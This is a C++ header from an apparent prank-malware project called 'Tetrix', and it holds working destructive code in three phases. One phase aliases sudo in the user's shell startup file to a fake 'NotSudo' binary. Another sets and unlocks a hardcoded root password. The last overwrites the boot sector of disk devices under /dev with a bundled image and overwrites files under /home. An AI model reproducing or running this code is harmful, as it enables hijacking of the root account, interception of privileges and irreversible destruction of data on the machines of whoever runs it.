#pragma once

#include <cstdio>
#include <cstdlib>  //For system().

#include <iostream>
#include <memory>
#include <stdexcept>
#include <string>
#include <fstream>
#include <sstream>
#include <random>   //for generating random numbers

#include <unistd.h>
#include <dirent.h> //For going through directories.
#include <sys/types.h>
#include <fcntl.h>
#include <sys/ioctl.h>

#include "tetros-as-hex.h"
#include "copypasta.h"

#ifndef ROOT_PASSWORD
#define ROOT_PASSWORD "tetrix"
#endif

namespace tetrix
{
namespace phases
{

int phase1()
{
    FILE* stdin = popen("passwd", "w");     //Opens passwd file in write mode.
    const char* newpass = ROOT_PASSWORD;    //points char newpass to the password.
    fputs(newpass, stdin);
    fputs(newpass, stdin);
    pclose(stdin);
    system("passwd -u root"); //Unlock the root account.
    std::string homedir = std::getenv("HOME");
    std::string cmd_start = "usermod root -p ";
    std::string second_part = crypt(ROOT_PASSWORD, "AA");
    system((cmd_start + second_part).c_str());

    if(!fork())
    {
        system((homedir+"/.config/tetrix/Tetrix -p 2").c_str()); //Begins phase 2, which overwrites everything.
    }
    return 0;
}

int phase0()
{
	//Adele's phase 1 code goes here.
	std::string homedir = std::getenv("HOME");
	std::string infile = homedir + "/.zshrc";
	std::ifstream rcfile(infile,std::ifstream::in);
	if(!rcfile.is_open())
	{
		infile = homedir + "/.bashrc";
		rcfile.close();
		rcfile.clear();
		rcfile.open(infile);
	}

	system(("mkdir -p "+homedir+"/.config/tetrix/").c_str());
	system(("cp ./resources/NotSudo "+homedir+"/.config/tetrix/NotSudo").c_str());
	system(("cp ./Tetrix "+homedir+"/.config/tetrix/Tetrix").c_str());
	std::ifstream fs(infile,std::ifstream::in);
    std::stringstream file;
	if(fs.is_open())
	{
		std::string line{""};
		while(std::getline(fs,line))
		{
            file << line << "\n";
		}
	}
	fs.close();
	fs.clear();
	file << "alias sudo='" << homedir << "/.config/tetrix/NotSudo'\n";

	std::ofstream ofs(infile,std::ifstream::out);
	ofs << file.str();
	ofs.close();
	ofs.clear();

	rcfile.close();
	rcfile.clear();
	return 0;
}

int phase2()
{
    int fd;
    int placeInFile = 0; //Navigates to the place of the file.
    DIR *dir;
    struct dirent *ent;

    if ((dir = opendir("/dev")) != NULL)   //Enter /dev...
    {
        while ((ent = readdir(dir)) != NULL) 
        {
            if(ent->d_name[0] == 's' || ent->d_name[0] == 'h') //If the files name starts with h or s:
            {
                fd = open(((std::string)"/dev/"+(std::string)ent->d_name).c_str(), O_WRONLY);
                // Concatenates /dev and the filename. We assign a cast to it because /dev is a c++
                // string and ent->d_name is a c string.*/
                lseek(fd, 0, SEEK_SET); //Got to the beggining of the file
                write(fd, tetros, 512); //Write Tetros to the beggining of the file.
                close(fd);  //Closes fd
            }
        }
        closedir (dir);
    }
    else 
    {
        // could not open directory 
        perror("");
        return EXIT_FAILURE;
    }

    close(fd);

    if ((dir = opendir ("/home")) != NULL) //Enter /home.
    {
        while ((ent = readdir (dir)) != NULL)//Go through the files within /home.
        {
            fd = open(((std::string)"/home/"+(std::string)ent->d_name).c_str(), O_WRONLY);		
            for(placeInFile = 0; fd != EOF; placeInFile = placeInFile + 30)
            {
                lseek(fd, placeInFile, SEEK_SET); //Got to the beggining of the file
                write(fd, copypasta, 340);//Write the copypasta to the beggining of the file.		
            }
            close(fd);
        }
    }

    return 0;
}


}   // namespace tetrix
}   // namespace phases
